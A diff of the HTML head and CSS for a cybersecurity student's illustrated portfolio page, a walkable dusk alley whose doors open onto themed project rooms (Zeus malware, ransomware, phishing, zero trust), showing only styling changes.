@@ -3,318 +3,377 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<meta name="description" content="Zain: cybersecurity, a dusk alley, an old man reading, and a black cat.">
 <title>Zain's Alley</title>
+<meta name="description" content="Zain: cybersecurity. Walk the alley with the black cat; every door is a project.">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Marcellus&family=Marcellus+SC&family=Alegreya:ital,wght@0,400;0,500;1,400&family=Aref+Ruqaa:wght@400;700&family=IM+Fell+English:ital@0;1&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Marcellus&family=Marcellus+SC&family=Aref+Ruqaa:wght@400;700&family=IM+Fell+English:ital@0;1&family=IBM+Plex+Mono:wght@400;600&display=swap">
 <style>
-/* Layout concept: one dusk alley in an old Levantine city; the site is walked through, not scrolled past. Single deliberate dusk palette. */
+/* One dusk alley in an old Levantine city, walked left to right, 2024 to 2026.
+   Every door is a room. A single dusk palette; lantern gold is the one accent. */
 :root{
-  --night:#141a2e;      /* sky at the top, page ground */
-  --dusk:#2a2440;       /* shadowed stone */
-  --stone:#d8c8a6;      /* limestone */
-  --stone-dim:#a8977a;
-  --lantern:#f1b75a;    /* warm light, the one accent */
-  --tile:#2f7f7a;       /* Damascus tile teal */
-  --olive:#6c7a3d;
-  --eye:#f3d02b;
-  --ink:#ece3cf;        /* text on night */
-  --muted:#b9ad95;
+  --night:#141a2e; --dusk:#2a2440; --stone:#d8c8a6; --stone-dim:#a8977a;
+  --lantern:#f1b75a; --brass:#d9a441; --eye:#f3d02b;
+  --ink:#ece3cf; --muted:#b9ad95; --paper:#efe4cb; --paper-ink:#2b2117; --rust:#6b2f2a;
   --display:"Marcellus SC","Marcellus",Georgia,serif;
-  --body:"Alegreya",Georgia,"Times New Roman",serif;
-  --arabic:"Aref Ruqaa","Amiri","Traditional Arabic",serif;
+  --plaque:"Marcellus",Georgia,serif;
+  --body:"IM Fell English",Georgia,"Times New Roman",serif;
+  --arabic:"Aref Ruqaa","Amiri",serif;
+  --mono:"IBM Plex Mono",ui-monospace,Menlo,Consolas,monospace;
   color-scheme:dark;
 }
+*{box-sizing:border-box}
+[hidden]{display:none!important}
 html{background:var(--night)}
-body{background:var(--night);color:var(--ink);font-family:var(--body);font-size:18px;line-height:1.6;margin:0}
-.wrap{padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px))}
+body{margin:0;background:var(--night);color:var(--ink);font-family:var(--body);font-size:18px;line-height:1.55;-webkit-tap-highlight-color:transparent}
+button{font:inherit;color:inherit}
+.vh{position:absolute!important;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0);white-space:nowrap}
+.gut{padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px))}
 
-/* ---------- scene ---------- */
-.scene{position:relative;width:100%;aspect-ratio:5/3;max-height:80vh;overflow:hidden;background:var(--night)}
-.scene svg{display:block;width:100%;height:100%}
+/* ---------------- the street ---------------- */
+.street{position:relative;height:min(78vh,max(62vw,440px));overflow:hidden;
+  background:linear-gradient(#141a2e 0%,#2a2440 52%,#6b4a5a 80%,#b9785c 100%);touch-action:pan-y;user-select:none;-webkit-user-select:none}
+.sky-fixed{position:absolute;inset:0;pointer-events:none}
+.street svg.world{position:absolute;top:0;left:0;height:100%;will-change:transform;display:block}
+.street .hint{position:absolute;left:50%;top:14px;transform:translateX(-50%);margin:0;font-family:var(--body);font-style:italic;font-size:15px;color:var(--ink);opacity:.85;
+  text-shadow:0 1px 6px #000a;white-space:nowrap;pointer-events:none;transition:opacity .8s}
+.street .hint.gone{opacity:0}
+.pad{position:absolute;bottom:14px;display:flex;gap:10px;z-index:3}
+.pad.l{left:max(14px,env(safe-area-inset-left,0px))}.pad.r{right:max(14px,env(safe-area-inset-right,0px))}
+.pad button{width:46px;height:46px;border-radius:50%;border:1px solid #f1b75a88;background:#141a2ecc;color:var(--lantern);font-size:20px;cursor:pointer;display:grid;place-items:center}
+.pad button:focus-visible{outline:2px solid var(--lantern);outline-offset:2px}
+.prompt{position:absolute;z-index:3;transform:translate(-50%,-100%);font-family:var(--display);font-size:13px;letter-spacing:.14em;color:#1f1a14;
+  background:var(--lantern);padding:5px 12px 4px;border-radius:2px;pointer-events:auto;cursor:pointer;opacity:0;transition:opacity .25s;white-space:nowrap;border:0}
+.prompt.on{opacity:1}
+.prompt[hidden]{display:none}
+
+.door{cursor:pointer;outline:none}
+.door .light{opacity:0;transition:opacity .35s}
+.door.near .light,.door:hover .light,.door:focus-visible .light{opacity:.55}
+.door:focus-visible .frame{stroke:var(--lantern);stroke-width:4}
+.door .leaf{transform-box:fill-box;transform-origin:left center;transition:transform .55s ease-in}
+.door.opening .leaf{transform:perspective(400px) rotateY(-75deg) scaleX(.35)}
+.pk{font-family:var(--display);font-size:10.5px;letter-spacing:.16em;fill:#5a4320}
+.pn{font-family:var(--plaque);font-size:17px;fill:#1f1a14}
+.year{font-family:var(--display);font-size:22px;letter-spacing:.3em;fill:#a8977a;opacity:.75}
 .flicker{animation:flicker 3.2s infinite steps(1)}
 @keyframes flicker{0%,100%{opacity:1}42%{opacity:.86}44%{opacity:1}71%{opacity:.92}}
 .glow{animation:breathe 4s ease-in-out infinite}
-@keyframes breathe{0%,100%{opacity:.55}50%{opacity:.8}}
+@keyframes breathe{0%,100%{opacity:.55}50%{opacity:.85}}
+.bulb{animation:twinkle 3s ease-in-out infinite}
+@keyframes twinkle{0%,100%{opacity:.95}50%{opacity:.55}}
 
-/* cat */
-#cat{transform:translate(-160px,0)}
-#cat.walking{animation:walk 7.5s cubic-bezier(.45,.05,.55,.95) forwards}
-@keyframes walk{to{transform:translate(560px,0)}}
+/* the cat */
 #cat .leg{transform-box:fill-box;transform-origin:top center}
-#cat.walking .leg.a{animation:step .5s ease-in-out infinite alternate}
-#cat.walking .leg.b{animation:step .5s ease-in-out infinite alternate-reverse}
-@keyframes step{from{transform:rotate(16deg)}to{transform:rotate(-16deg)}}
+#cat.walking .leg.a{animation:step .42s ease-in-out infinite alternate}
+#cat.walking .leg.b{animation:step .42s ease-in-out infinite alternate-reverse}
+@keyframes step{from{transform:rotate(18deg)}to{transform:rotate(-18deg)}}
 #cat .tail{transform-box:fill-box;transform-origin:0% 100%;animation:sway 3.4s ease-in-out infinite}
 @keyframes sway{0%,100%{transform:rotate(0)}50%{transform:rotate(-9deg)}}
-#cat-sit{opacity:0;transition:opacity .5s}
-.sat #cat-walk{opacity:0;transition:opacity .4s}
-.sat #cat-sit{opacity:1}
-.eye{animation:blink 6s infinite}
-.eye{transform-box:fill-box;transform-origin:center}
+#cat .sit{opacity:0;transition:opacity .35s}
+#cat.sat .walk{opacity:0;transition:opacity .25s}
+#cat.sat .sit{opacity:1}
+.eye{animation:blink 6s infinite;transform-box:fill-box;transform-origin:center}
 @keyframes blink{0%,94%,100%{transform:scaleY(1)}96%{transform:scaleY(.1)}}
 
-/* doors */
-.door{cursor:pointer;outline:none}
-.door .light{opacity:0;transition:opacity .4s}
-.door:hover .light,.door:focus-visible .light,.door.open .light{opacity:1}
-.door:focus-visible .frame{stroke:var(--lantern);stroke-width:3}
-.plaque{font-family:"Marcellus",Georgia,serif;font-size:17px;letter-spacing:.02em;fill:#1f1a14}
-.plaque-k{font-family:var(--display);font-size:10.5px;letter-spacing:.16em;fill:#5a4320}
+/* the map along the bottom */
+.map{position:relative;margin:0;padding:18px 0 4px;background:#1a1730;border-top:1px solid #2f2b45}
+.map ol{list-style:none;margin:0 auto;padding:0;display:flex;justify-content:space-between;align-items:flex-start;max-width:72rem;position:relative}
+.map ol::before{content:"";position:absolute;left:6px;right:6px;top:6px;height:1px;background:#4a4360}
+.map li{position:relative;display:grid;justify-items:center;flex:1;min-width:0}
+.map button{all:unset;cursor:pointer;display:grid;justify-items:center;gap:6px;padding:0 2px 8px;max-width:100%}
+.map .dot{width:13px;height:13px;border-radius:50%;background:#2a2440;border:1px solid var(--stone-dim);position:relative;z-index:1}
+.map .lbl{font-family:var(--plaque);font-size:12.5px;line-height:1.2;color:var(--muted);text-align:center;max-width:7.5em}
+.map .yr{font-family:var(--display);font-size:10px;letter-spacing:.15em;color:var(--stone-dim)}
+.map button:hover .lbl,.map button[aria-current=true] .lbl{color:var(--ink)}
+.map button[aria-current=true] .dot{background:var(--lantern);border-color:var(--lantern);box-shadow:0 0 0 4px #f1b75a33}
+.map button:focus-visible .dot{outline:2px solid var(--lantern);outline-offset:3px}
+@media (max-width:760px){.map .lbl,.map .yr{display:none}.map li.cur .lbl{display:block;position:absolute;top:20px;width:8em;font-size:12px}.map{padding-bottom:22px}}
 
-/* ---------- below the scene ---------- */
-.ground{border-top:1px solid #2f2b45;background:linear-gradient(var(--dusk),var(--night) 60%)}
-.inner{max-width:62rem;margin:0 auto;padding-block:3.5rem 4rem;display:grid;gap:3rem}
+/* ---------------- below the street ---------------- */
+.ground{background:linear-gradient(#1a1730,var(--night) 60%)}
+.inner{max-width:62rem;margin:0 auto;padding-block:3.5rem 3rem;display:grid;gap:2.6rem;justify-items:center}
 .mine{margin:0 auto;max-width:40rem;display:grid;gap:1.6rem;text-align:center}
-.mine p{margin:0;font-family:"Aref Ruqaa","IM Fell English",Georgia,serif;font-size:clamp(1.45rem,3.3vw,2.2rem);line-height:1.6;color:var(--stone)}
+.mine p{margin:0;font-family:var(--arabic);font-size:clamp(1.45rem,3.3vw,2.2rem);line-height:1.6;color:var(--stone)}
 .mine p span{display:block}
 .mine .open{font-size:.72em;color:var(--muted)}
 .mine .reveal{font-weight:700;color:var(--lantern);font-size:clamp(1.7rem,4vw,2.7rem)}
 .mine .reveal::before{content:"";display:block;width:3.5rem;height:1px;margin:0 auto 1.4rem;background:var(--lantern);opacity:.6}
-.nudge{margin:0;font-family:"IM Fell English",Georgia,serif;font-style:italic;font-size:1.15rem;color:var(--muted)}
-.nudge button{all:unset;cursor:pointer;color:var(--lantern);border-bottom:1px solid var(--lantern)}
-.nudge button:focus-visible{outline:2px solid var(--lantern);outline-offset:3px}
-#reader:focus-visible{outline:2px solid var(--lantern)}
+.nudge{margin:0;font-style:italic;font-size:1.1rem;color:var(--muted);text-align:center}
+.linkish{all:unset;cursor:pointer;color:var(--lantern);border-bottom:1px solid var(--lantern)}
+.linkish:focus-visible{outline:2px solid var(--lantern);outline-offset:3px}
+footer.sig{text-align:center;padding:0 0 3rem;color:var(--muted);font-size:.95rem}
+footer.sig a{color:var(--lantern)}
 
-/* the book: grows out of the old man's hands into an open spread */
+/* ---------------- the old man's book ---------------- */
 .veil[hidden]{display:none}
-.veil{position:fixed;inset:0;z-index:20;background:rgba(10,12,22,.78);display:grid;place-items:center;overflow-y:auto;
+.veil{position:fixed;inset:0;z-index:40;background:rgba(10,12,22,.8);display:grid;place-items:center;overflow-y:auto;
   padding:max(16px,env(safe-area-inset-top,0px)) max(16px,env(safe-area-inset-right,0px)) max(16px,env(safe-area-inset-bottom,0px)) max(16px,env(safe-area-inset-left,0px))}
-.book{--paper:#efe4cb;--paper2:#e3d4b3;--ink2:#2b2117;--rule:#c9b68f;position:relative;width:min(62rem,100%);
-  display:grid;grid-template-columns:1fr 1fr;
+.book{--paper2:#e3d4b3;--rule:#c9b68f;position:relative;width:min(62rem,100%);display:grid;grid-template-columns:1fr 1fr;
   background:linear-gradient(90deg,var(--paper2),var(--paper) 46%,#c8b590 50%,var(--paper) 54%,var(--paper2));
-  color:var(--ink2);box-shadow:0 40px 80px -20px #000c;border-radius:3px 3px 8px 8px}
-.page{padding:2.6rem 2.3rem 2.2rem;min-width:0;font-family:"IM Fell English",Georgia,serif}
+  color:var(--paper-ink);box-shadow:0 40px 80px -20px #000c;border-radius:3px 3px 8px 8px}
+.page{padding:2.6rem 2.3rem 2.2rem;min-width:0}
 .cover{margin:0 0 1.4rem;font-size:1.6rem;line-height:1.25}
 .cover span{font-style:italic;font-size:1.1rem;color:#7a5a2c}
-.toc{margin:0;padding:0 0 0 1.3rem;display:grid;gap:.4rem;font-size:1.08rem}
+.toc{margin:0;padding:0 0 0 1.5rem;display:grid;gap:.35rem;font-size:1.05rem}
 .toc li::marker{color:#7a5a2c;font-style:italic}
 .toc button{all:unset;cursor:pointer;border-bottom:1px solid transparent}
-.toc button:hover{border-bottom-color:var(--ink2)}
-.toc button[aria-current=true]{font-style:italic;color:#6b2f2a}
+.toc button:hover{border-bottom-color:var(--paper-ink)}
+.toc button[aria-current=true]{font-style:italic;color:var(--rust)}
 .page.right{display:grid;align-content:start;gap:.7rem;border-left:1px solid var(--rule)}
 .page.right h2{margin:0;font-weight:400;font-size:clamp(1.7rem,3vw,2.2rem);line-height:1.15;text-wrap:balance}
 .when{margin:0;font-style:italic;color:#7a5a2c;min-height:1.2em}
 .field{margin:0;font-style:italic}
-#p-text{margin:0;max-width:58ch;line-height:1.55;font-size:1.1rem}
-.turn{display:flex;align-items:center;gap:1rem;margin-top:1rem;font-style:italic;color:#7a5a2c}
-.turn button,.close{all:unset;cursor:pointer;font-size:1.5rem;line-height:1;padding:.2rem .45rem;color:var(--ink2)}
-.close{position:absolute;top:.5rem;right:.7rem;font-size:1.8rem}
-.book button:focus-visible{outline:2px solid #6b2f2a;outline-offset:2px}
+#p-text{margin:0;max-width:58ch;line-height:1.55;font-size:1.08rem}
+.turn{display:flex;align-items:center;gap:1rem;margin-top:.6rem;font-style:italic;color:#7a5a2c;flex-wrap:wrap}
+.turn button,.book .close{all:unset;cursor:pointer;font-size:1.5rem;line-height:1;padding:.2rem .45rem;color:var(--paper-ink)}
+.turn .go{font-size:1.05rem;border-bottom:1px solid var(--rust);color:var(--rust);padding:0}
+.book .close{position:absolute;top:.5rem;right:.7rem;font-size:1.8rem}
+.book button:focus-visible{outline:2px solid var(--rust);outline-offset:2px}
 .flip{animation:flip .45s ease}
 @keyframes flip{from{opacity:.15;transform:translateX(14px)}to{opacity:1;transform:none}}
 @media (max-width:720px){.book{grid-template-columns:1fr;background:var(--paper)}.page.right{border-left:0;border-top:1px solid var(--rule)}.page{padding:2rem 1.3rem 1.6rem}}
+
+/* ---------------- rooms ---------------- */
+.fade{position:fixed;inset:0;background:#07080f;z-index:30;opacity:0;pointer-events:none;transition:opacity .45s}
+.fade.on{opacity:1}
+.room[hidden]{display:none}
+.room{position:fixed;inset:0;z-index:35;overflow-y:auto;overscroll-behavior:contain;color:var(--ink);background:var(--rbg,#1b1828)}
+.room > .back{position:fixed;inset:0;width:100%;height:100%;z-index:-1;display:block}
+.room .bar{position:sticky;top:0;z-index:5;display:flex;justify-content:space-between;align-items:flex-start;gap:12px;
+  padding:max(14px,env(safe-area-inset-top,0px)) max(16px,env(safe-area-inset-right,0px)) 10px max(16px,env(safe-area-inset-left,0px));
+  background:linear-gradient(var(--rbg,#1b1828) 55%,transparent)}
+.room .title{margin:0;display:grid;gap:2px}
+.room .title .k{font-family:var(--display);font-size:12px;letter-spacing:.2em;color:var(--lantern)}
+.room .title h2{margin:0;font-family:var(--plaque);font-weight:400;font-size:clamp(1.5rem,3.4vw,2.3rem);line-height:1.1}
+.room .title .d{font-style:italic;color:var(--muted);font-size:1rem}
+.leave{all:unset;cursor:pointer;font-family:var(--display);letter-spacing:.14em;font-size:13px;color:var(--lantern);border-bottom:1px solid #f1b75a88;padding:4px 0;white-space:nowrap;margin-top:6px}
+.leave:focus-visible{outline:none;border-bottom:2px solid var(--lantern);color:#fff}
+@media (max-width:640px){.room .bar{flex-direction:column-reverse;align-items:stretch;gap:4px}.leave{align-self:flex-end;margin:0}.room .title .d{font-size:.92rem}}
+.room .body{max-width:74rem;margin:0 auto;padding:6px max(16px,env(safe-area-inset-right,0px)) 120px max(16px,env(safe-area-inset-left,0px));display:grid;gap:28px}
+.room .two{display:grid;grid-template-columns:minmax(0,1.15fr) minmax(0,1fr);gap:clamp(20px,4vw,56px);align-items:start}
+@media (max-width:860px){.room .two{grid-template-columns:1fr}}
+.room p{margin:0}
+.note{font-size:1.05rem;line-height:1.6;max-width:60ch;color:var(--ink)}
+.note em{color:var(--lantern);font-style:italic}
+.facts{margin:0;padding:0 0 0 1.1rem;display:grid;gap:.45rem;font-size:1rem;color:var(--ink);max-width:60ch}
+.facts li::marker{content:"✸  ";color:var(--brass);font-size:.8em}
+.mine-line{font-style:italic;color:var(--muted);border-left:1px solid var(--brass);padding-left:14px;max-width:60ch}
+.label{font-family:var(--display);font-size:11.5px;letter-spacing:.18em;color:var(--brass);margin:0 0 6px}
+.mono{font-family:var(--mono)}
+.act{all:unset;cursor:pointer;font-family:var(--display);letter-spacing:.12em;font-size:13px;color:#1f1a14;background:var(--lantern);padding:9px 16px 8px;border-radius:2px;text-align:center}
+.act.ghost{background:transparent;color:var(--lantern);box-shadow:inset 0 0 0 1px #f1b75a99}
+.act:focus-visible{outline:2px solid var(--ink);outline-offset:3px}
+.act[disabled]{opacity:.45;cursor:default}
+.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+.room-cat{position:fixed;right:max(10px,env(safe-area-inset-right,0px));bottom:0;width:86px;z-index:36;pointer-events:none}
+.later{font-size:.92rem;font-style:italic;color:var(--muted)}
+
+/* airport */
+.board{background:#0e0f13;border-radius:6px;padding:14px 12px;box-shadow:inset 0 0 0 3px #26242c,0 20px 40px -20px #000;overflow-x:auto}
+.board table{border-collapse:separate;border-spacing:3px;width:100%;min-width:420px;font-family:var(--mono);font-size:14px}
+.board th{font-weight:600;color:#c9c2a8;text-align:left;font-size:11px;letter-spacing:.12em;padding:0 4px 4px}
+.board td{background:#1c1c22;color:#f6c84a;padding:6px 7px;border-radius:2px;white-space:nowrap}
+.board tr.gone td{color:#5b5a50;text-decoration:line-through}
+.board tr.next td{color:#fff3c4;background:#2b2a1c}
+.taxi{position:relative;height:96px;margin-top:14px;border-bottom:2px dashed #6b6450}
+.taxi .plane{position:absolute;bottom:6px;width:46px;transition:left .6s ease,transform 1.2s ease-in,opacity 1.2s}
+.taxi .plane.up{transform:translate(260px,-120px) rotate(-18deg);opacity:0}
+.taxi .tag{position:absolute;bottom:-22px;left:50%;transform:translateX(-50%);font-family:var(--mono);font-size:10px;color:var(--muted)}
+
+/* zero trust */
+.gates{position:relative;display:grid;grid-template-columns:repeat(5,1fr);align-items:end;gap:6px;padding:20px 0 6px}
+.gate{display:grid;justify-items:center;gap:6px;text-align:center;font-size:.85rem;color:var(--muted)}
+.gate svg{width:58px;height:74px}
+.gate.ok svg .g{stroke:#7fbf7a}.gate.no svg .g{stroke:#d0584e}
+.gate b{font-family:var(--display);font-weight:400;font-size:11px;letter-spacing:.14em;color:var(--ink)}
+.token{position:absolute;top:40px;left:0;width:26px;height:18px;transition:left .55s ease}
+.verdict{font-family:var(--mono);font-size:.95rem;min-height:1.6em}
+.verdict.ok{color:#9bd496}.verdict.no{color:#e9897f}
+.risks{display:grid;grid-template-columns:repeat(auto-fit,minmax(min(100%,15rem),1fr));gap:4px 26px;margin:0;padding:0;list-style:none}
+.risks li{display:flex;gap:10px;align-items:baseline;font-size:1rem;padding:6px 0;border-bottom:1px solid #ffffff14}
+.risks li span{font-family:var(--display);font-size:11px;color:var(--brass);letter-spacing:.1em}
+
+/* archive */
+.cabinet{display:grid;grid-template-columns:repeat(auto-fill,minmax(8.6rem,1fr));gap:8px}
+.drawer{all:unset;cursor:pointer;background:linear-gradient(#6b4a2e,#563a24);color:#f0e2c2;border-radius:3px;padding:12px 10px 10px;text-align:center;
+  box-shadow:inset 0 0 0 1px #2b1d12,inset 0 -6px 0 #3e2a1a;font-family:var(--plaque);font-size:1rem;position:relative;transition:transform .25s}
+.drawer::after{content:"";display:block;width:28px;height:5px;margin:8px auto 0;border-radius:3px;background:var(--brass)}
+.drawer[aria-pressed=true]{transform:translateY(-4px);box-shadow:inset 0 0 0 1px #2b1d12,inset 0 -6px 0 #3e2a1a,0 0 0 2px var(--lantern)}
+.drawer:focus-visible{outline:2px solid var(--lantern);outline-offset:2px}
+.card{background:var(--paper);color:var(--paper-ink);padding:18px 20px;border-radius:2px;transform:rotate(-.6deg);box-shadow:0 14px 30px -14px #000;min-height:7rem}
+.card h3{margin:0 0 6px;font-family:var(--plaque);font-weight:400;font-size:1.35rem}
+.card p,.card li{font-size:1rem}
+.card ul{margin:6px 0 0;padding-left:1.1rem}
+.helix{width:100%;max-width:520px;height:auto;display:block}
+.helix .strand{transition:d .9s ease}
+
+/* zeus */
+.case{width:100%;max-width:460px;height:auto;display:block;cursor:pointer}
+.case:focus-visible{outline:2px solid var(--lantern);outline-offset:4px}
+.tabs{display:flex;gap:18px;border-bottom:1px solid #ffffff22;margin-bottom:14px}
+.tabs button{all:unset;cursor:pointer;font-family:var(--display);letter-spacing:.14em;font-size:13px;padding:8px 0;color:var(--muted);border-bottom:2px solid transparent}
+.tabs button[aria-selected=true]{color:var(--lantern);border-bottom-color:var(--lantern)}
+.tabs button:focus-visible{outline:2px solid var(--lantern);outline-offset:3px}
+.scr{background:#0c1016;border-radius:6px;padding:14px 16px;font-family:var(--mono);font-size:13.5px;line-height:1.55;color:#cfe3d0;box-shadow:inset 0 0 0 2px #1f2a33;overflow-x:auto}
+.scr .c{color:#7d8f9c}.scr .k{color:#f1b75a}.scr .r{color:#e9897f}.scr .g{color:#9bd496}
+.fn{all:unset;cursor:pointer;display:block;padding:4px 6px;border-radius:2px}
+.fn[aria-pressed=true]{background:#1f2a33;color:#fff}
+.fn:focus-visible{outline:1px solid var(--lantern)}
+.meter{height:10px;background:#2b2a36;border-radius:5px;overflow:hidden}
+.meter i{display:block;height:100%;background:linear-gradient(90deg,#c0463c,#e07a4f);width:0;transition:width 1.2s ease}
+.ptree{margin:0;padding:0;list-style:none}
+.ptree li{padding:2px 0}
+.ptree .inj{color:#e9897f}
+
+/* zelto */
+.phone-wrap{display:grid;justify-items:center;gap:14px}
+.phone{width:min(300px,82vw);aspect-ratio:9/18.5;background:#0b0b10;border-radius:38px;padding:14px;box-shadow:0 0 0 2px #2c2a33,0 30px 60px -20px #000;position:relative}
+.phone::before{content:"";position:absolute;top:22px;left:50%;width:70px;height:6px;border-radius:3px;background:#1e1d24;transform:translateX(-50%);z-index:2}
+.screen{width:100%;height:100%;border-radius:28px;background:#f4f1ea;color:#1d1b20;overflow:hidden;display:flex;flex-direction:column;font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;font-size:13px}
+.screen .sb{display:flex;justify-content:space-between;padding:12px 18px 6px;font-size:11px;color:#444;font-weight:600}
+.screen .app{flex:1;padding:8px 14px 14px;display:flex;flex-direction:column;gap:9px;overflow:hidden}
+.screen .apph{font-weight:700;font-size:15px}
+.screen .bub{background:#e6e1d6;border-radius:14px 14px 14px 4px;padding:9px 11px;max-width:88%;line-height:1.35}
+.screen .bub a{color:#2a54b5;text-decoration:underline}
+.screen .term{background:#121418;color:#cfe3d0;border-radius:10px;padding:10px;font-family:var(--mono);font-size:10.5px;line-height:1.5;white-space:pre-wrap;word-break:break-all;flex:1;overflow:hidden}
+.screen .term .r{color:#ff8a7d}.screen .term .k{color:#f1b75a}.screen .term .g{color:#9bd496}.screen .term .c{color:#7d8f9c}
+.screen .row2{display:flex;justify-content:space-between;background:#fff;border-radius:10px;padding:8px 10px}
+.steps{display:flex;gap:6px;justify-content:center}
+.steps i{width:8px;height:8px;border-radius:50%;background:#4a4360}
+.steps i.on{background:var(--lantern)}
+.tally{display:flex;gap:26px;flex-wrap:wrap}
+.tally div{display:grid;gap:2px}
+.tally b{font-family:var(--plaque);font-weight:400;font-size:2.2rem;line-height:1}
+.tally span{font-family:var(--display);font-size:11px;letter-spacing:.16em;color:var(--muted)}
+
+/* lost and found */
+.shelf{position:relative;display:grid;grid-template-columns:repeat(5,minmax(0,1fr));gap:10px;align-items:end;padding:10px 6px 0;border-bottom:14px solid #4f3823;box-shadow:0 10px 0 -4px #2b1d12}
+.item{all:unset;cursor:pointer;display:grid;justify-items:center;gap:6px;padding-bottom:6px;position:relative}
+.item svg{width:100%;max-width:92px;height:auto;transition:transform .25s}
+.item:hover svg,.item[aria-pressed=true] svg{transform:translateY(-6px)}
+.item .tagp{font-family:var(--plaque);font-size:.85rem;background:var(--paper);color:var(--paper-ink);padding:2px 8px;border-radius:2px;transform:rotate(-3deg);text-align:center;line-height:1.2}
+@media (max-width:640px){.item .tagp{font-size:.68rem;padding:2px 4px}}
+.item[aria-pressed=true] .tagp{background:var(--lantern)}
+.item:focus-visible{outline:2px solid var(--lantern);outline-offset:4px}
+.switch{display:inline-flex;align-items:center;gap:12px;cursor:pointer;font-family:var(--display);letter-spacing:.12em;font-size:13px;background:none;border:0;padding:0;color:var(--ink)}
+.switch .tr{width:54px;height:28px;border-radius:14px;background:#5a2f2f;position:relative;transition:background .3s}
+.switch .tr::after{content:"";position:absolute;top:3px;left:3px;width:22px;height:22px;border-radius:50%;background:var(--paper);transition:left .3s}
+.switch[aria-checked=true] .tr{background:#3e6b3a}
+.switch[aria-checked=true] .tr::after{left:29px}
+.switch:focus-visible{outline:2px solid var(--lantern);outline-offset:4px}
+.room.lf.hard{--rbg:#1c2420}
+.room.lf{transition:background .6s}
+
+/* ransomware */
+.racks{display:grid;grid-template-columns:repeat(10,1fr);gap:6px}
+.rack{aspect-ratio:1/2.4;border-radius:3px;background:#262a33;position:relative;box-shadow:inset 0 0 0 2px #15171c;transition:background .6s}
+.rack::before{content:"";position:absolute;inset:10% 18%;background:repeating-linear-gradient(#3a404c 0 6px,transparent 6px 12px)}
+.rack.enc{background:#5a1f22}
+.rack.enc::after{content:"";position:absolute;left:50%;top:50%;width:14px;height:12px;transform:translate(-50%,-30%);border-radius:2px;background:#e9897f;box-shadow:0 -7px 0 -3px #e9897f}
+.rack.ok{background:#1f3a26}
+.slider{width:100%;accent-color:var(--lantern)}
+.tl{display:grid;gap:6px;margin:0;padding:0;list-style:none}
+.tl li{display:grid;grid-template-columns:4.6rem 1fr;gap:10px;opacity:.35;transition:opacity .3s;font-size:.98rem}
+.tl li.on{opacity:1}
+.tl li b{font-family:var(--mono);font-weight:600;color:var(--lantern);font-size:.9rem}
+.fork{display:grid;gap:10px}
+.fork .q{font-family:var(--plaque);font-size:1.15rem}
+.seg{display:inline-flex;box-shadow:inset 0 0 0 1px #f1b75a88;border-radius:2px}
+.seg button{all:unset;cursor:pointer;padding:7px 14px;font-family:var(--display);font-size:12px;letter-spacing:.12em;color:var(--lantern)}
+.seg button[aria-pressed=true]{background:var(--lantern);color:#1f1a14}
+.seg button:focus-visible{outline:2px solid var(--ink);outline-offset:2px}
+.mapsvg{width:100%;height:auto;display:block}
+
+/* cipher */
+.wheel{width:min(340px,80vw);height:auto;display:block;margin:0 auto;touch-action:none;cursor:grab}
+.wheel .inner{transition:transform .35s ease}
+.blocks{display:flex;flex-wrap:wrap;gap:6px 4px;font-family:var(--mono);font-size:1.05rem;min-height:2.6em}
+.blk{display:inline-flex;flex-direction:column;align-items:center;gap:2px}
+.blk span{padding:4px 6px;border-radius:2px;letter-spacing:.12em}
+.blk.c span{background:#4a3a1a;color:#f6d79a}
+.blk.s span{background:#173c3a;color:#a8e0d8}
+.blk small{font-family:var(--display);font-size:9.5px;letter-spacing:.14em;color:var(--muted)}
+.blk.s small b{color:#a8e0d8;font-weight:400}
+.field-in{all:unset;width:100%;font-family:var(--mono);font-size:1.05rem;border-bottom:1px solid var(--brass);padding:6px 2px;color:var(--ink)}
+.field-in:focus-visible{border-bottom-color:var(--lantern);box-shadow:0 1px 0 var(--lantern)}
+
+/* quantumsoc */
+.soc{background:#0b0f17;border-radius:8px;padding:16px;box-shadow:inset 0 0 0 2px #1d2a3a,0 0 60px -20px #2f7f7a;display:grid;gap:12px}
+.hs{width:100%;height:auto;display:block}
+.hs .msg{transition:transform 1.1s ease,opacity .3s}
+.bars{display:grid;gap:8px}
+.bar{display:grid;grid-template-columns:9.5rem 1fr 4.5rem;gap:10px;align-items:center;font-family:var(--mono);font-size:12.5px}
+.bar i{display:block;height:12px;border-radius:2px;background:#2f7f7a;transition:width .9s ease;min-width:2px}
+.bar.pq i{background:#f1b75a}
+.bar output{text-align:right;color:#cfe3d0}
+.feed{height:180px;overflow:hidden;font-family:var(--mono);font-size:11.5px;line-height:1.6;color:#9fb3c8;position:relative}
+.feed div{white-space:nowrap}
+.feed .hi{color:#f1b75a}
+.feed::after{content:"";position:absolute;inset:auto 0 0 0;height:40px;background:linear-gradient(transparent,#0b0f17)}
+.gauge{width:200px;height:auto;display:block}
+
+/* cyberus */
+.loop{width:100%;max-width:520px;height:auto;display:block}
+.mail{background:#fbf8f1;color:#222;border-radius:4px;padding:16px 18px;font-family:system-ui,Segoe UI,Roboto,sans-serif;font-size:14px;line-height:1.5;box-shadow:0 18px 40px -18px #000}
+.mail .hdr{font-size:12.5px;color:#555;border-bottom:1px solid #ddd;padding-bottom:8px;margin-bottom:10px}
+.flag{background:none;border:0;padding:0;font:inherit;color:inherit;cursor:pointer;border-bottom:2px dotted #c0463c}
+.flag.on{background:#ffe1dc}
+.flag:focus-visible{outline:2px solid #c0463c}
+.found{font-family:var(--mono);font-size:.9rem;color:var(--lantern)}
+
+/* kitchen, rooftop, cat */
+.scene-svg{width:100%;height:auto;display:block;max-width:640px;margin:0 auto}
+.oven-door{transform-box:fill-box;transform-origin:center bottom;transition:transform .7s ease}
+.open .oven-door{transform:translateY(16px) scaleY(.14)}
+.steam path{opacity:0}
+.open .steam path{animation:steam 2.4s ease-out infinite}
+.open .steam path:nth-child(2){animation-delay:.8s}.open .steam path:nth-child(3){animation-delay:1.6s}
